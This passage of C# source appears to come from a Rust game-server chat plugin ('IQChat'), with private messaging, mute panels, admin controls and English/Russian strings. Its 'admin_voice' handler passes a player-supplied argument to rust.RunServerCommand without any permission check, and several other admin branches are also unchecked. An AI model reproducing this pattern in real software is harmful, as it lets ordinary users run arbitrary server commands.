            Log($"ЛИЧНЫЕ СООБЩЕНИЯ : {player.displayName} отправил сообщение игроку - {RetargetUser.displayName}\nСООБЩЕНИЕ : {Message}");

            RCon.Broadcast(RCon.LogType.Chat, new Chat.ChatEntry
            {
                Message = $"ЛИЧНЫЕ СООБЩЕНИЯ : {DisplayNick}({player.userID}) -> {RetargetUser.displayName} : СООБЩЕНИЕ : {Message}",
                UserId = player.UserIDString,
                Username = player.displayName,
                Channel = Chat.ChatChannel.Global,
                Time = (DateTime.UtcNow.Hour * 3600) + (DateTime.UtcNow.Minute * 60),
                Color = "#3f4bb8",
            });
            PrintWarning($"ЛИЧНЫЕ СООБЩЕНИЯ : {DisplayNick}({player.userID}) -> {RetargetUser.displayName} : СООБЩЕНИЕ : {Message}");
        }

        [ChatCommand("ignore")]
        void IgnorePlayerPM(BasePlayer player, string cmd, string[] arg)
        {
            if (!config.MessageSetting.IgnoreUsePM) return;
            var ChatUser = ChatSettingUser[player.userID];
            if (arg.Length == 0 || arg == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("INGORE_NOTARG", this, player.UserIDString));
                return;
            }
            string NameUser = arg[0];
            BasePlayer TargetUser = FindPlayer(NameUser);
            if (TargetUser == null || NameUser == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, lang.GetMessage("COMMAND_PM_NOT_USER", this, player.UserIDString));
                return;
            }

            string Lang = !ChatUser.IgnoredUsers.Contains(TargetUser.userID) ? GetLang("IGNORE_ON_PLAYER", player.UserIDString, TargetUser.displayName) : GetLang("IGNORE_OFF_PLAYER", player.UserIDString, TargetUser.displayName);
            ReplySystem(Chat.ChatChannel.Global, player, Lang);
            if (!ChatUser.IgnoredUsers.Contains(TargetUser.userID))
                ChatUser.IgnoredUsers.Add(TargetUser.userID);
            else ChatUser.IgnoredUsers.Remove(TargetUser.userID);
        }

        #endregion

        [ConsoleCommand("alert")]
        void ChatAlertPlayersCMD(ConsoleSystem.Arg arg) => Alert(arg.Player(), arg.Args);

        [ConsoleCommand("alertui")]
        void ChatAlertPlayersUICMD(ConsoleSystem.Arg arg) => AlertUI(arg.Player(), arg.Args);

        [ConsoleCommand("alertuip")]
        void CmodAlertOnlyUser(ConsoleSystem.Arg arg)
        {
            if (arg.Args == null || arg.Args.Length < 2)
            {
                PrintWarning("Используйте правильно ситаксис : alertuip Steam64ID Сообщение");
                return;
            }
            ulong SteamID = ulong.Parse(arg.Args[0]);
            var argList = arg.Args.ToArray();
            string Message = string.Join(" ", argList.ToArray().Skip(1));
            if (Message.Length > 125) return;
            if (Message.Length <= 0 || Message == null)
            {
                PrintWarning("Вы не указали сообщение игроку");
                return;
            }
            BasePlayer player = BasePlayer.FindByID(SteamID);
            if (player == null)
            {
                PrintWarning("Игрока нет в сети");
                return;
            }
            UIAlert(player, Message);
        }

        [ConsoleCommand("saybro")]
        void ChatAlertPlayerInPM(ConsoleSystem.Arg arg)
        {
            if (arg.Args == null || arg.Args.Length < 2)
            {
                PrintWarning("Используйте правильно ситаксис : saybro Steam64ID Сообщение");
                return;
            }
            ulong SteamID = ulong.Parse(arg.Args[0]);
            var argList = arg.Args.ToArray();
            string Message = string.Join(" ", argList.ToArray());
            if (Message.Length > 125) return;
            if (Message.Length <= 0 || Message == null)
            {
                PrintWarning("Вы не указали сообщение игроку");
                return;
            }
            BasePlayer player = BasePlayer.FindByID(SteamID);
            if(player == null)
            {
                PrintWarning("Игрока нет в сети");
                return;
            }
            ReplySystem(Chat.ChatChannel.Global, player, Message.Replace(SteamID.ToString(), ""));
        }

        [ConsoleCommand("set")]
        private void ConsolesCommandPrefixSet(ConsoleSystem.Arg arg)
        {
            if (arg.Args == null || arg.Args.Length != 3)
            {
                PrintWarning("Используйте правильно ситаксис : set [Steam64ID] [prefix/chat/nick/custom] [Argument]");
                return;
            }
            ulong Steam64ID = 0;
            BasePlayer player = null;
            if (ulong.TryParse(arg.Args[0], out Steam64ID))
                player = BasePlayer.FindByID(Steam64ID);
            if (player == null)
            {
                PrintWarning("Неверно указан SteamID игрока или ошибка в синтаксисе\nИспользуйте правильно ситаксис : set [Steam64ID] [prefix/chat/nick/custom] [Argument]");
                return;
            }
            var DataPlayer = ChatSettingUser[player.userID];

            switch (arg.Args[1].ToLower())
            {
                case "prefix":
                    {
                        string KeyPrefix = arg.Args[2];
                        foreach (var Prefix in config.PrefixList.Where(x => x.Permissions == KeyPrefix))
                            if (config.PrefixList.Contains(Prefix))
                            {
                                DataPlayer.ChatPrefix = Prefix.Argument;
                                Puts($"Префикс успешно установлен на - {Prefix.Argument}");
                            }
                            else Puts("Неверно указан Permissions от префикса");
                        break;
                    }
                case "chat":
                    {
                        string KeyChatColor = arg.Args[2];
                        foreach (var ColorChat in config.PrefixList.Where(x => x.Permissions == KeyChatColor))
                            if (config.MessageColorList.Contains(ColorChat))
                            {
                                DataPlayer.MessageColor = ColorChat.Argument;
                                Puts($"Цвет сообщения успешно установлен на - {ColorChat.Argument}");
                            }
                            else Puts("Неверно указан Permissions от префикса");
                        break;
                    }
                case "nick":
                    {
                        string KeyNickColor = arg.Args[2];
                        foreach (var ColorChat in config.NickColorList.Where(x => x.Permissions == KeyNickColor))
                            if (config.NickColorList.Contains(ColorChat))
                            {
                                DataPlayer.NickColor = ColorChat.Argument;
                                Puts($"Цвет ника успешно установлен на - {ColorChat.Argument}");
                            }
                            else Puts("Неверно указан Permissions от префикса");
                        break;
                    }
                case "custom":
                    {
                        string CustomPrefix = arg.Args[2];
                        DataPlayer.ChatPrefix = CustomPrefix;
                        Puts($"Кастомный префикс успешно установлен на - {CustomPrefix}");
                        break;
                    }
                default:
                    {
                        PrintWarning("Используйте правильно ситаксис : set [Steam64ID] [prefix/chat/nick/custom] [Argument]");
                        break;
                    }
            }

        }

        #endregion

        #region FuncCommand

        [ConsoleCommand("mute_search")]
        void ConsoleSearchMute(ConsoleSystem.Arg arg)
        {
            BasePlayer moder = arg.Player();
            if (arg.Args == null || arg.Args.Length == 0) return;
            string Searcher = arg.Args[0].ToLower();
            if (string.IsNullOrEmpty(Searcher) || Searcher.Length == 0 || Searcher.Length < 1) return;
            UI_MuteMenu(moder, Searcher);
        }                              
        
        [ConsoleCommand("iq_chat")]
        private void ConsoleCommandIQChat(ConsoleSystem.Arg arg)
        {
            BasePlayer player = arg.Player();
            if (player == null) return;
            var DataPlayer = ChatSettingUser[player.userID];

            switch (arg.Args[0])
            {
                #region Setting
                case "setting": 
                    {
                        switch(arg.Args[1])
                        {
                            case "prefix":
                                {
                                    UI_PrefixSetting(player);
                                    break;
                                }
                            case "nick":
                                {
                                    UI_NickSetting(player);
                                    break;
                                }
                            case "chat":
                                {
                                    UI_TextSetting(player);
                                    break;
                                }
                            case "rank":
                                {
                                    UI_RankSettings(player);
                                    break;
                                }
                        }
                        break;
                    }
                #endregion

                #region Action
                case "action": 
                    {
                        switch(arg.Args[1])
                        {
                            case "prefix":
                                {
                                    var Selected = arg.Args[2];
                                    var Permission = arg.Args[3];
                                    if (!permission.UserHasPermission(player.UserIDString, Permission)) return;

                                    if (config.MessageSetting.MultiPrefix)
                                    {
                                        if (!DataPlayer.MultiPrefix.Contains(Selected))
                                            DataPlayer.MultiPrefix.Add(Selected);
                                        else DataPlayer.MultiPrefix.Remove(Selected);
                                    }
                                    if (DataPlayer.ChatPrefix != Selected)
                                        DataPlayer.ChatPrefix = Selected;
                                    else DataPlayer.ChatPrefix = config.AutoSetupSetting.ReturnDefaultSetting.PrefixDefault;
                                    UpdateLabel(player, DataPlayer);
                                    break;
                                }
                            case "nick":
                                {
                                    var Selected = arg.Args[2];
                                    var Permission = arg.Args[3];
                                    if (!permission.UserHasPermission(player.UserIDString, Permission)) return;

                                    if (DataPlayer.NickColor != Selected)
                                        DataPlayer.NickColor = Selected;
                                    else DataPlayer.NickColor = config.AutoSetupSetting.ReturnDefaultSetting.NickDefault;
                                    UpdateLabel(player, DataPlayer);
                                    break;
                                }
                            case "chat":
                                {
                                    var Selected = arg.Args[2];
                                    var Permission = arg.Args[3];
                                    if (!permission.UserHasPermission(player.UserIDString, Permission)) return;

                                    if (DataPlayer.MessageColor != Selected)
                                        DataPlayer.MessageColor = Selected;
                                    else DataPlayer.MessageColor = config.AutoSetupSetting.ReturnDefaultSetting.MessageDefault;
                                    UpdateLabel(player, DataPlayer);
                                    break;
                                }
                            case "rank":
                                {
                                    string RankKey = arg.Args[2];
                                    IQRankSetRank(player.userID, RankKey);
                                    UpdateLabel(player, DataPlayer, IQRankGetNameRankKey(RankKey));
                                    break;
                                }
                        }
                        break;
                    }
                #endregion
                
                #region Mute
                case "mute":
                    {
                        string Action = arg.Args[1];
                        switch (Action)
                        {
                            case "menu":
                                {
                                    if (permission.UserHasPermission(player.UserIDString, PermMuteMenu))
                                        UI_MuteMenu(player);
                                    break;
                                }
                            case "actionmenu":
                                {
                                    BasePlayer target = BasePlayer.FindByID(ulong.Parse(arg.Args[2]));
                                    UI_MuteTakeAction(player, target.userID);
                                    break;
                                }
                            case "action": 
                                {
                                    BasePlayer target = BasePlayer.FindByID(ulong.Parse(arg.Args[2]));
                                    string MuteAction = arg.Args[3];
                                    switch (MuteAction)
                                    {
                                        case "mute":
                                            {
                                                string MuteFormat = arg.Args[4];
                                                UI_ReasonMute(player, target.userID, MuteFormat);
                                                break;
                                            }
                                        case "mute_reason":
                                            {
                                                CuiHelper.DestroyUi(player, MAIN_PARENT);
                                                string MuteFormat = arg.Args[4];
                                                int Index = Convert.ToInt32(arg.Args[5]);
                                                MutePlayer(target, MuteFormat, Index, "", "", player);
                                                break;
                                            }
                                        case "unmutechat":
                                            {
                                                CuiHelper.DestroyUi(player, MAIN_PARENT);
                                                ChatSettingUser[target.userID].MuteChatTime = 0;
                                                ReplyBroadcast(GetLang("FUNC_MESSAGE_UNMUTE_CHAT", player.UserIDString, player.displayName, target.displayName));
                                                break;
                                            }
                                        case "unmutevoice":
                                            {
                                                CuiHelper.DestroyUi(player, MAIN_PARENT);
                                                ChatSettingUser[target.userID].MuteVoiceTime = 0;
                                                ReplyBroadcast(GetLang("FUNC_MESSAGE_UNMUTE_VOICE", player.UserIDString, player.displayName, target.displayName));
                                                break;
                                            }
                                    }
                                    break;
                                }
                        }
                        break;
                    }              
                #endregion

                #region ADMIN
                case "admin_voice":
                    {
                        var Command = arg.Args[1];
                        switch(Command)
                        {
                            case "mutevoice":
                                {
                                    AdminSetting.MuteVoiceAll = true;
                                    foreach (var p in BasePlayer.activePlayerList)
                                        ChatSettingUser[p.userID].MuteVoiceTime = CurrentTime() + 86400;
                                    ReplyBroadcast(lang.GetMessage("FUNC_MESSAGE_MUTE_ALL_VOICE", this, player.UserIDString));
                                    break;
                                }
                            case "unmutevoice":
                                {
                                    AdminSetting.MuteVoiceAll = false;
                                    foreach (var p in BasePlayer.activePlayerList)
                                        ChatSettingUser[p.userID].MuteVoiceTime = 0;
                                    ReplyBroadcast(lang.GetMessage("FUNC_MESSAGE_UNMUTE_ALL_VOICE", this, player.UserIDString));
                                    break;
                                }
                        }
                        foreach (var p in BasePlayer.activePlayerList)
                            rust.RunServerCommand(Command, p.userID);
                        break;
                    }
                case "admin_chat":
                    {
                        var Command = arg.Args[1];
                        switch(Command)
                        {
                            case "mutechat":
                                {
                                    AdminSetting.MuteChatAll = true;
                                    foreach (var p in BasePlayer.activePlayerList)
                                        MuteAllChatPlayer(p);
                                    ReplyBroadcast(lang.GetMessage("FUNC_MESSAGE_MUTE_ALL_CHAT", this, player.UserIDString));
                                    break;
                                }
                            case "unmutechat":
                                {
                                    AdminSetting.MuteChatAll = false;
                                    foreach (var p in BasePlayer.activePlayerList)
                                        ChatSettingUser[p.userID].MuteChatTime = 0;
                                    ReplyBroadcast(lang.GetMessage("FUNC_MESSAGE_UNMUTE_ALL_CHAT", this, player.UserIDString));
                                    break;
                                }
                        }
                        break;
                    }
                    #endregion
            }
        }

        #endregion

        #endregion

        #region Lang
        private new void LoadDefaultMessages()
        {
            PrintWarning("Языковой файл загружается...");
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["TITLE_ONE"] = "<size=30><b>Chat SETTINGS</b></size>",
                ["TITLE_TWO"] = "<size=16><b>SELECT</b></size>",
                ["UI_CLOSE_BTN"] = "<size=20>CLOSE</size>",

                ["UI_TEXT_PREFIX"] = "<size=14>TAG</size>",
                ["UI_TEXT_COLOR_NICK"] = "<size=14>NICKNAME COLOR</size>",
                ["UI_TEXT_COLOR_MSG"] = "<size=14>TEXT COLOR</size>",
                ["UI_TEXT_RANK"] = "<size=23>RANKS</size>",
                ["UI_TEXT_VOTE_MENU"] = "<size=19>VOTED</size>",
                ["UI_TEXT_MUTE_MENU_BTN"] = "<size=14>MUTED PLAYERS</size>",

                ["UI_TEXT_ADMIN_PANEL"] = "<size=14><b>ADMIN PANEL</b></size>",
                ["UI_TEXT_MODER_PANEL"] = "<size=14><b>MOD PANEL</b></size>",
                ["UI_TEXT_ADMIN_PANEL_MUTE_CHAT_ALL"] = "<size=14>DISABLE CHAT</size>",
                ["UI_TEXT_ADMIN_PANEL_UNMUTE_CHAT_ALL"] = "<size=14>ENABLE CHAT</size>",
                ["UI_TEXT_ADMIN_PANEL_MUTE_VOICE_ALL"] = "<size=14>DISABLE VOICE</size>",
                ["UI_TEXT_ADMIN_PANEL_UNMUTE_VOICE_ALL"] = "<size=14>ENABLE VOICE</size>",

                ["UI_ALERT_TITLE"] = "<size=18><b>ATTENTION PLEASE</b></size>",

                ["UI_TITLE_NEW_PREFIX_ELEMENT"] = "<size=16><b>CHANGE TAG</b></size>",
                ["UI_TITLE_NEW_NICK_COLOR_ELEMENT"] = "<size=16><b>CHANGE NICKNAME COLOR</b></size>",
                ["UI_TITLE_NEW_MESSAGE_COLOR_ELEMENT"] = "<size=16><b>CHANGE TEXT COLOR</b></size>",
                ["UI_TITLE_NEW_MESSAGE_RANK_ELEMENT"] = "<size=16><b>CHANGER RANK</b></size>",

                ["FUNC_MESSAGE_MUTE_CHAT"] = "{0} muted {1} for {2}\nReason : {3}",
                ["FUNC_MESSAGE_UNMUTE_CHAT"] = "{0} unmuted {1}",
                ["FUNC_MESSAGE_MUTE_VOICE"] = "{0} muted voice to {1} for {2}\nReason : {3}",
                ["FUNC_MESSAGE_UNMUTE_VOICE"] = "{0} unmuted voice to {1}",
                ["FUNC_MESSAGE_MUTE_ALL_CHAT"] = "Chat disabled",
                ["FUNC_MESSAGE_UNMUTE_ALL_CHAT"] = "Chat enabled",
                ["FUNC_MESSAGE_MUTE_ALL_VOICE"] = "Voice chat disabled",
                ["FUNC_MESSAGE_UNMUTE_ALL_VOICE"] = "Voice chat enabled",

                ["FUNC_MESSAGE_ISMUTED_TRUE"] = "You can not send the messages {0}\nYou are muted",
                ["FUNC_MESSAGE_NO_ARG_BROADCAST"] = "You can not send an empty broadcast message!",

                ["UI_MUTE_PANEL_TITLE"] = "<size=20><b>MUTE PANEL</b></size>",
                ["UI_MUTE_PANEL_TITLE_ACTION"] = "<size=15>CHOOSE PLAYER OR SEARCH BY NICKNAME</size>",
                ["UI_MUTE_PANEL_TITLE_HELPS_LOCK"] = "<size=13><b>- PLAYER HAS DISABLED CHAT OR VOICECHAT</b></size>",
                ["UI_MUTE_PANEL_TITLE_HELPS_UNLOCK"] = "<size=13><b>- PLAYER HAS ENABLED CHAT OR VOICECHAT</b></size>",

                ["UI_MUTE_TAKE_ACTION_PANEL"] = "<size=18><b>SELECT\nACTION</b></size>",
                ["UI_MUTE_TAKE_ACTION_CHAT"] = "<size=12>MUTE\nCHAT</size>",
                ["UI_MUTE_TAKE_ACTION_CHAT_UNMUTE"] = "<size=12>UNMUTE\nCHAT</size>",
                ["UI_MUTE_TAKE_ACTION_VOICE"] = "<size=12>MUTE\nVOICE</size>",
                ["UI_MUTE_TAKE_ACTION_VOICE_UNMUTE"] = "<size=12>UNMUTE\nVOICE</size>",

                ["UI_MUTE_TAKE_REASON_TITLE"] = "<size=18><b>CHOOSE\nREASON</b></size>",

                ["COMMAND_NOT_PERMISSION"] = "You dont have permissions to use this command",
                ["COMMAND_RENAME_NOTARG"] = "For rename use : /rename New nickname",
                ["COMMAND_RENAME_SUCCES"] = "You have successful changed your name to {0}",

                ["COMMAND_PM_NOTARG"] = "To send pm use : /pm Nickname Message",
                ["COMMAND_PM_NOT_NULL_MSG"] = "Message is empty!",
                ["COMMAND_PM_NOT_USER"] = "User not found or offline",
                ["COMMAND_PM_SUCCESS"] = "Your private message sent successful\nMessage : {0}",
                ["COMMAND_PM_SEND_MSG"] = "Message from {0}\n{1}",

                ["COMMAND_R_NOTARG"] = "For reply use : /r Message",
                ["COMMAND_R_NOTMSG"] = "You dont have any private conversations yet!",

                ["FLOODERS_MESSAGE"] = "You're typing too fast! Please Wait {0} seconds",

                ["PREFIX_SETUP"] = "You have successfully removed the prefix {0}, it is already activated and installed",
                ["COLOR_CHAT_SETUP"] = "You have successfully picked up the <color={0}>chat color</color>, it is already activated and installed",
                ["COLOR_NICK_SETUP"] = "You have successfully taken the <color={0}>nickname color</color>, it is already activated and installed",

                ["PREFIX_RETURNRED"] = "Your prefix {0} expired, it was reset automatically",
                ["COLOR_CHAT_RETURNRED"] = "Action of your <color={0}>color chat</color> over, it is reset automatically",
                ["COLOR_NICK_RETURNRED"] = "Action of your <color={0}>color nick</color> over, it is reset automatically",

                ["WELCOME_PLAYER"] = "{0} came online",
                ["LEAVE_PLAYER"] = "{0} left",
                ["WELCOME_PLAYER_WORLD"] = "{0} came online. Country: {1}",
                ["LEAVE_PLAYER_REASON"] = "{0} left. Reason: {1}",

                ["IGNORE_ON_PLAYER"] = "You added {0} in black list",
                ["IGNORE_OFF_PLAYER"] = "You removed {0} from black list",
                ["IGNORE_NO_PM"] = "This player added you in black list. Your message has not been delivered.",
                ["IGNORE_NO_PM_ME"] = "You added this player in black list. Your message has not been delivered.",
                ["INGORE_NOTARG"] = "To ignore a player use : /ignore nickname",

                ["DISCORD_SEND_LOG_CHAT"] = "Player : {0}({1})\nFiltred message : {2}\nMessage : {3}",
                ["DISCORD_SEND_LOG_MUTE"] = "{0}({1}) give mute chat\nSuspect : {2}({3})\nReason : {4}",
            }, this);

            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["TITLE_ONE"] = "<size=30><b>НАСТРОЙКА ЧАТА</b></size>",
                ["TITLE_TWO"] = "<size=16><b>ВЫБЕРИТЕ ДЕЙСТВИЕ</b></size>",
                ["UI_CLOSE_BTN"] = "<size=20>ЗАКРЫТЬ</size>",

                ["UI_TEXT_PREFIX"] = "<size=23>ПРЕФИКС</size>",
                ["UI_TEXT_COLOR_NICK"] = "<size=23>НИК</size>",
                ["UI_TEXT_COLOR_MSG"] = "<size=23>ТЕКСТ</size>",
                ["UI_TEXT_RANK"] = "<size=23>РАНГ</size>",
                ["UI_TEXT_MUTE_MENU_BTN"] = "<size=23>МУТЫ</size>",

                ["UI_TEXT_ADMIN_PANEL"] = "<size=17><b>ПАНЕЛЬ\nАДМИНИСТРАТОРА</b></size>",
                ["UI_TEXT_MODER_PANEL"] = "<size=17><b>ПАНЕЛЬ\nМОДЕРАТОРА</b></size>",
                ["UI_TEXT_ADMIN_PANEL_MUTE_CHAT_ALL"] = "<size=14>ВЫКЛЮЧИТЬ ЧАТ</size>",
                ["UI_TEXT_ADMIN_PANEL_UNMUTE_CHAT_ALL"] = "<size=14>ВКЛЮЧИТЬ ЧАТ</size>",
                ["UI_TEXT_ADMIN_PANEL_MUTE_VOICE_ALL"] = "<size=14>ВЫКЛЮЧИТЬ ГОЛОС</size>",
                ["UI_TEXT_ADMIN_PANEL_UNMUTE_VOICE_ALL"] = "<size=14>ВКЛЮЧИТЬ ГОЛОС</size>",

                ["UI_ALERT_TITLE"] = "<size=18><b>МИНУТОЧКУ ВНИМАНИЯ</b></size>",

                ["UI_TITLE_NEW_PREFIX_ELEMENT"] = "<size=16><b>ВЫБЕРИТЕ ПРЕФИКС</b></size>",
                ["UI_TITLE_NEW_NICK_COLOR_ELEMENT"] = "<size=16><b>ВЫБЕРИТЕ ЦВЕТ НИКА</b></size>",
                ["UI_TITLE_NEW_MESSAGE_COLOR_ELEMENT"] = "<size=16><b>ВЫБЕРИТЕ ЦВЕТ ТЕКСТА</b></size>",
                ["UI_TITLE_NEW_MESSAGE_RANK_ELEMENT"] = "<size=16><b>ВЫБЕРИТЕ СЕБЕ РАНГ</b></size>",

                ["FUNC_MESSAGE_MUTE_CHAT"] = "{0} заблокировал чат игроку {1} на {2}\nПричина : {3}",
                ["FUNC_MESSAGE_UNMUTE_CHAT"] = "{0} разблокировал чат игроку {1}",
                ["FUNC_MESSAGE_MUTE_VOICE"] = "{0} заблокировал голос игроку {1} на {2}\nПричина : {3}",
                ["FUNC_MESSAGE_UNMUTE_VOICE"] = "{0} разблокировал голос игроку {1}",
                ["FUNC_MESSAGE_MUTE_ALL_CHAT"] = "Всем игрокам был заблокирован чат",
                ["FUNC_MESSAGE_UNMUTE_ALL_CHAT"] = "Всем игрокам был разблокирован чат",
                ["FUNC_MESSAGE_MUTE_ALL_VOICE"] = "Всем игрокам был заблокирован голос",
                ["FUNC_MESSAGE_UNMUTE_ALL_VOICE"] = "Всем игрокам был разблокирован голос",

                ["FUNC_MESSAGE_ISMUTED_TRUE"] = "Вы не можете отправлять сообщения еще {0}\nВаш чат заблокирован",
                ["FUNC_MESSAGE_NO_ARG_BROADCAST"] = "Вы не можете отправлять пустое сообщение в оповещение!",

                ["UI_MUTE_PANEL_TITLE"] = "<size=20><b>ПАНЕЛЬ УПРАВЛЕНИЯ БЛОКИРОВКАМИ ЧАТА</b></size>",
                ["UI_MUTE_PANEL_TITLE_ACTION"] = "<size=15>ВЫБЕРИТЕ ИГРОКА ИЛИ ВВЕДИТЕ НИК В ПОИСКЕ</size>",
                ["UI_MUTE_PANEL_TITLE_HELPS_LOCK"] = "<size=13><b>- У ИГРОКА ЗАБЛОКИРОВАН ЧАТ ИЛИ ГОЛОС</b></size>",
                ["UI_MUTE_PANEL_TITLE_HELPS_UNLOCK"] = "<size=13><b>- У ИГРОКА РАЗБЛОКИРОВАН ЧАТ ИЛИ ГОЛОС</b></size>",

                ["UI_MUTE_TAKE_ACTION_PANEL"] = "<size=18><b>ВЫБЕРИТЕ\nДЕЙСТВИЕ</b></size>",
                ["UI_MUTE_TAKE_ACTION_CHAT"] = "<size=12>ЗАБЛОКИРОВАТЬ\nЧАТ</size>",
                ["UI_MUTE_TAKE_ACTION_CHAT_UNMUTE"] = "<size=12>РАЗБЛОКИРОВАТЬ\nЧАТ</size>",
                ["UI_MUTE_TAKE_ACTION_VOICE"] = "<size=12>ЗАБЛОКИРОВАТЬ\nГОЛОС</size>",
                ["UI_MUTE_TAKE_ACTION_VOICE_UNMUTE"] = "<size=12>РАЗБЛОКИРОВАТЬ\nГОЛОС</size>",

                ["UI_MUTE_TAKE_REASON_TITLE"] = "<size=18><b>ВЫБЕРИТЕ\nПРИЧИНУ</b></size>",

                ["COMMAND_NOT_PERMISSION"] = "У вас недостаточно прав для данной команды",
                ["COMMAND_RENAME_NOTARG"] = "Используйте команду так : /rename Новый Ник",
                ["COMMAND_RENAME_SUCCES"] = "Вы успешно изменили ник на {0}",

                ["COMMAND_PM_NOTARG"] = "Используйте команду так : /pm Ник Игрока Сообщение",
                ["COMMAND_PM_NOT_NULL_MSG"] = "Вы не можете отправлять пустое сообщение",
                ["COMMAND_PM_NOT_USER"] = "Игрок не найден или не в сети",
                ["COMMAND_PM_SUCCESS"] = "Ваше сообщение успешно доставлено\nСообщение : {0}",
                ["COMMAND_PM_SEND_MSG"] = "Сообщение от {0}\n{1}",

                ["COMMAND_R_NOTARG"] = "Используйте команду так : /r Сообщение",
                ["COMMAND_R_NOTMSG"] = "Вам или вы ещё не писали игроку в личные сообщения!",

                ["FLOODERS_MESSAGE"] = "Вы пишите слишком быстро! Подождите {0} секунд",

                ["PREFIX_SETUP"] = "Вы успешно забрали префикс {0}, он уже активирован и установлен",
                ["COLOR_CHAT_SETUP"] = "Вы успешно забрали <color={0}>цвет чата</color>, он уже активирован и установлен",
                ["COLOR_NICK_SETUP"] = "Вы успешно забрали <color={0}>цвет ника</color>, он уже активирован и установлен",

                ["PREFIX_RETURNRED"] = "Действие вашего префикса {0} окончено, он сброшен автоматически",
                ["COLOR_CHAT_RETURNRED"] = "Действие вашего <color={0}>цвета чата</color> окончено, он сброшен автоматически",
                ["COLOR_NICK_RETURNRED"] = "Действие вашего префикса <color={0}>цвет чата</color> окончено, он сброшен автоматически",

                ["WELCOME_PLAYER"] = "{0} зашел на сервер",
                ["LEAVE_PLAYER"] = "{0} вышел с сервера",
                ["WELCOME_PLAYER_WORLD"] = "{0} зашел на сервер.Из {1}",
                ["LEAVE_PLAYER_REASON"] = "{0} вышел с сервера.Причина {1}",

                ["IGNORE_ON_PLAYER"] = "Вы добавили игрока {0} в черный список",
                ["IGNORE_OFF_PLAYER"] = "Вы убрали игрока {0} из черного списка",
                ["IGNORE_NO_PM"] = "Данный игрок добавил вас в ЧС,ваше сообщение не будет доставлено",
                ["IGNORE_NO_PM_ME"] = "Вы добавили данного игрока в ЧС,ваше сообщение не будет доставлено",
                ["INGORE_NOTARG"] = "Используйте команду так : /ignore Ник Игрока",

                ["DISCORD_SEND_LOG_CHAT"] = "Игрок : {0}({1})\nФильтрованное сообщение : {2}\nИзначальное сообщение : {3}",
                ["DISCORD_SEND_LOG_MUTE"] = "{0}({1}) выдал блокировку чата\nИгрок : {2}({3})\nПричина : {4}",
            }, this, "ru");
           
            PrintWarning("Языковой файл загружен успешно");
        }
        #endregion

        #region Helpers
        public void Log(string LoggedMessage) => LogToFile("IQChatLogs", LoggedMessage, this);
        public static string FormatTime(TimeSpan time)
        {
            string result = string.Empty;
            if (time.Days != 0)
                result += $"{Format(time.Days, "дней", "дня", "день")} ";

            if (time.Hours != 0)
                result += $"{Format(time.Hours, "часов", "часа", "час")} ";

            if (time.Minutes != 0)
                result += $"{Format(time.Minutes, "минут", "минуты", "минут")} ";

            if (time.Seconds != 0)
                result += $"{Format(time.Seconds, "секунд", "секунды", "секунда")} ";

            return result;
        }
        private static string Format(int units, string form1, string form2, string form3)
        {
            var tmp = units % 10;

            if (units >= 5 && units <= 20 || tmp >= 5 && tmp <= 9)
                return $"{units} {form1}";

            if (tmp >= 2 && tmp <= 4)
                return $"{units} {form2}";

            return $"{units} {form3}";
        }
        private BasePlayer FindPlayer(string nameOrId)
        {
            foreach (var check in BasePlayer.activePlayerList.Where(x => x.displayName.ToLower().Contains(nameOrId.ToLower()) || x.UserIDString == nameOrId))
                return check;
            return null;
        }
        private static string HexToRustFormat(string hex)
        {
            Color color;
            ColorUtility.TryParseHtmlString(hex, out color);
            sb.Clear();
            return sb.AppendFormat("{0:F2} {1:F2} {2:F2} {3:F2}", color.r, color.g, color.b, color.a).ToString();
        }
        #endregion

        #region ChatFunc

        public Dictionary<ulong, double> Flooders = new Dictionary<ulong, double>();
        void ReplyChat(Chat.ChatChannel channel, BasePlayer player, string OutMessage)
        {
            var MessageSetting = config.MessageSetting;
            if (MessageSetting.AntiSpamActivate)
                if (!permission.UserHasPermission(player.UserIDString, MessageSetting.PermAdminImmunitetAntispam))
                {
                    if (!Flooders.ContainsKey(player.userID))
                        Flooders.Add(player.userID, CurrentTime() + MessageSetting.FloodTime);
                    else
                        if (Flooders[player.userID] > CurrentTime())
                        {
                            ReplySystem(Chat.ChatChannel.Global, player, GetLang("FLOODERS_MESSAGE", player.UserIDString, Convert.ToInt32(Flooders[player.userID] - CurrentTime())));
                            return;
                        }

                    Flooders[player.userID] = MessageSetting.FloodTime + CurrentTime();
                }

            if (channel == Chat.ChatChannel.Global)
            {
                foreach (BasePlayer p in BasePlayer.activePlayerList)
                {
                    p.SendConsoleCommand("chat.add", new object[] { (int)channel, player.userID, OutMessage });
                }
                PrintToConsole(OutMessage);
            }
            if (channel == Chat.ChatChannel.Team)
            {
                RelationshipManager.PlayerTeam Team = RelationshipManager.ServerInstance.FindTeam(player.currentTeam);
                if (Team == null) return;
                foreach (var FindPlayers in Team.members)
                {
                    BasePlayer TeamPlayer = BasePlayer.FindByID(FindPlayers);
                    if (TeamPlayer == null) continue;

                    TeamPlayer.SendConsoleCommand("chat.add", channel, player.userID, OutMessage);
                }
            }
        }

        void ReplySystem(Chat.ChatChannel channel, BasePlayer player, string Message,string CustomPrefix = "", string CustomAvatar = "", string CustomHex = "")
        {
            string Prefix = string.IsNullOrEmpty(CustomPrefix) ? config.MessageSetting.BroadcastTitle : CustomPrefix;
            ulong Avatar = string.IsNullOrEmpty(CustomAvatar) ? config.MessageSetting.Steam64IDAvatar : ulong.Parse(CustomAvatar);
            string Hex = string.IsNullOrEmpty(CustomHex) ? config.MessageSetting.BroadcastColor : CustomHex;

            string FormatMessage = $"{Prefix}<color={Hex}>{Message}</color>";
            if (channel == Chat.ChatChannel.Global)
                player.SendConsoleCommand("chat.add", channel, Avatar, FormatMessage);         
        }

        void ReplyBroadcast(string Message, string CustomPrefix = "", string CustomAvatar = "")
        {
            foreach(var p in BasePlayer.activePlayerList)
                ReplySystem(Chat.ChatChannel.Global, p, Message, CustomPrefix, CustomAvatar);
        }

        static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        static double CurrentTime() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        #endregion

        #region API

        void API_SEND_PLAYER(BasePlayer player,string PlayerFormat, string Message, string Avatar, Chat.ChatChannel channel = Chat.ChatChannel.Global)
        {
            var MessageSettings = config.MessageSetting;
            string OutMessage = Message;

            if (MessageSettings.FormatingMessage)
